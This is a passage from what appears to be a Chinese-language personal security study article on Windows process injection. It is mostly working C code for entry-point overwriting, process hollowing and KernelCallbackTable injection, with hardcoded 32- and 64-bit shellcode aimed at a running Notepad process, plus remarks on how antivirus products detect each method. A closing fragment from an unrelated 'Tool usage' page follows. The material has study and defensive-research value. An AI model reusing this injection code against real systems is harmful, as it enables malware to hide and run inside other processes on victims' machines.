NULL)) { printf(\"读取目标进程的NT头失败，错误码 %lu\\n\", GetLastError()); return 1; } // 找到可选头里的入口偏移，然后算EntryPoint的真实地址 LPVOID entry_point = (LPVOID)(ntHeader.OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imagebase_addr); // 将入口点的代码覆盖掉 if (!WriteProcessMemory(pi.hProcess, entry_point, shellcode64, sizeof(shellcode64), NULL)) { printf(\"修改进程入口点代码失败，错误码 %lu\\n\", GetLastError()); } // 恢复主线程执行 ResumeThread(pi.hThread); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 5、傀儡进程 根据统计这是比较经典的进程注入的方式，所以被很多的恶意软件和APT组织所使用，所以导致目前主流的杀毒软件和沙箱都对他有很完善的检查策略，所以基本没有什么实际的用处了。 流程 创建一个挂起的进程，然后将该进程的内存映射取消掉，换成shellcode或者payload这些代码，然后再恢复进程运行状态 挂起进程 通过创建的方式创建一个挂起状态的进程，和之前的几个一个套路 取消映射 利用 NtUnmapViewOfSection来取消原来的映射，并利用VirtualAllocEx函数申请内存区域。 重新申请 利用VirtualAllocEx重新申请一块空间，然后把准备好的东西写进去 设置PEB 重新写PEB里的base address【64->RDX】并设置好RCX寄存器（64位） 恢复执行 直接resume就行了（不要注入svchost） 实现代码 #include #include #include typedef LONG(NTAPI* NtUnMapViewOfSectionPtr)(HANDLE hProcess, PVOID BaseAddress); typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main(int argc, char* argv[]) { // 准备要往里面替换的进程,一定要使用完整目录 LPCSTR file_path = \"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\Debug\\\\injected.exe\"; HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\"Open EXE File Failed error code: %d\", GetLastError()); return 1; } DWORD dwFileSize = GetFileSize(hFile, NULL); PBYTE pBuf = (PBYTE)malloc(dwFileSize); DWORD dwBytesRead = 0; if (!ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL)) { printf(\"ReadFile Failed error code: %d\", GetLastError()); CloseHandle(hFile); free(pBuf); return 1; } // 得到主要运行内容的dos和nt头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader->e_lfanew); //2.获取进程上下文 ： 第一步：创建傀儡进程外壳，设置挂起状态，保存上下文信息 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; if (!CreateProcessA(NULL, (LPSTR)\"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\father.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; if (GetThreadContext(pi.hThread, &ctx) == 0) { printf(\"CreateProcess failed %d\\n\", GetLastError()); return 1; } //3.清空目标进程 ： 第二步：取消原先的进程的内存 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtUnMapViewOfSectionPtr NtUnMapViewOfSection = (NtUnMapViewOfSectionPtr)GetProcAddress(hNtdll, \"NtUnmapViewOfSection\"); LPVOID dwProcessBaseAddr = 0; // 获取目标进程的base address， 然后将他的内存取消注册 // context.Ecx = 基地址的地址，因此从context.Ebx + 8的地址读取4字节的内容并转化为DWORD类型，既是进程加载的基地址 if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rcx, &dwProcessBaseAddr, sizeof(PVOID), NULL)) { printf(\"ReadProcessMemory failed %lu\\n\", GetLastError()); return 1; } // 通过x64dbg看到确实可以 NtUnMapViewOfSection(pi.hProcess, (LPCVOID)ctx.Rcx); //4.重新分配空间 LPVOID lpAddr = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。 if (lpAddr == NULL) { printf(\"VirtualAlloc failed %d\\n\", GetLastError()); return 1; } //5.写入傀儡进程 // 替换PE头 // 这里在内存中开辟的40000的空间写入了被注入程序的所有的头，节区留着后面写 if (!WriteProcessMemory(pi.hProcess, lpAddr, (LPCVOID)pBuf, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换节 // 将地址seek到节区头开始 DWORD nt_size = sizeof(IMAGE_NT_HEADERS); long long tmp = (pBuf + pDosHeader->e_lfanew); LPVOID lpSectionBaseAddr = (LPVOID)(tmp + nt_size); PIMAGE_SECTION_HEADER pSectionHeader; for (DWORD dwIndex = 0; dwIndex FileHeader.NumberOfSections; ++dwIndex) { pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr; // 句柄，要写入进程的地址，指向本程序的要往外写的内容的地址 LPVOID RemoteProcess_address = (LPVOID)((BYTE*)lpAddr + pSectionHeader->VirtualAddress); LPVOID LocalProcess_address = (LPCVOID)(pBuf + pSectionHeader->PointerToRawData); if (!WriteProcessMemory(pi.hProcess, RemoteProcess_address, LocalProcess_address, pSectionHeader->SizeOfRawData, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } lpSectionBaseAddr = (LPVOID)((BYTE*)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER)); } //6.恢复现场并运行傀儡进程 // 替换PEB中基地址 DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase; // 另一种修改peb的方式 /* NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress; // 修改peb结构体中的baseaddress的值 if (!WriteProcessMemory(pi.hProcess, (LPVOID)((BYTE*)pef_offset+0x10), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } */ // 另一种修改peb的方式 rdx保留了peb的baseaddr, 不要使用(LPCVOID)&dwImageBase，会造成高地址全是cc //WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL); if (!WriteProcessMemory(pi.hProcess, (LPVOID)((ctx.Rdx)+0x10), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换入口点 64 -> rcx; 32 -> eax //ctx.Rcx = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint; ctx.Rcx = (SIZE_T)((LPBYTE)pNtHeaders->OptionalHeader.ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint); if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed : %d\\n\", GetLastError()); return 1; } //CreateRemoteThread(pi.hThread, 0, 0, (LPTHREAD_START_ROUTINE)(dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), 0, 0, NULL); ResumeThread(pi.hThread); free(pBuf); return 0; } 思路简单，就是写起来比较麻烦，但是可以直接注入整个exe文件，比较方便，查杀率高的一逼 6、消息回调注入 通过修改PEB表中的特定消息回调函数的指针使其指向shellcode，然后再向该进程发送消息，触发shellcode执行。SendMessage函数来发送消息进行shellcode的触发。 先用windbg看一下PEB的结构， attach一个进程，然后 !peb # 定位到kct的地址 dps addr L100 # 查看kct的具体内容 老多内容了。 流程 找到目标进程句柄，找到peb地址，定位KernelCallBackTable表（kct表），然后申请内存空间写入shellcode 定位peb 定位kct 申请shellcode空间 创建新的kct 将新的kct的里面的某一个消息回调的地址进行设置为shellcode 更新kct 触发shellcode 实现代码 #include #include #include #include \"struct.h\" // https://github.com/capt-meelo/KernelCallbackTable-Injection/blob/master/KCT.cpp // http://hacky.ren/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/ // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; /* typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; */ typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; HWND hWnd = FindWindow(L\"Notepad\", NULL); DWORD processId; DWORD threadId = GetWindowThreadProcessId(hWnd, &processId); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); //printf(\"[++] processId 0x%lp\\n[++] threadId 0x%lp\", processId, threadId); // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; //ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb & kct address PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); KERNELCALLBACKTABLE kct; ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL); //DWORD_PTR kct_addr = (DWORD_PTR)(BYTE*)peb_addr + 0x58; // 申请空间写入shellcode LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, payloadAddr, shellcode64, sizeof(shellcode64), NULL); // 创建一个新的kct，因为之前的不能写 LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr; WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL); // 更新kct WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL); // 触发shellcode COPYDATASTRUCT cds; WCHAR msg[] = L\"Pwn\"; cds.dwData = 1; cds.cbData = lstrlen(msg) * 2; cds.lpData = msg; SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds); printf(\"[+] Payload executed\\n\"); return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-18 20:11:44 "},"MyArticles/ToolUsage.html":{"url":"MyArticles/ToolUsage.html","title":"Tool usage","keywords":"","body":"工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:47 "}}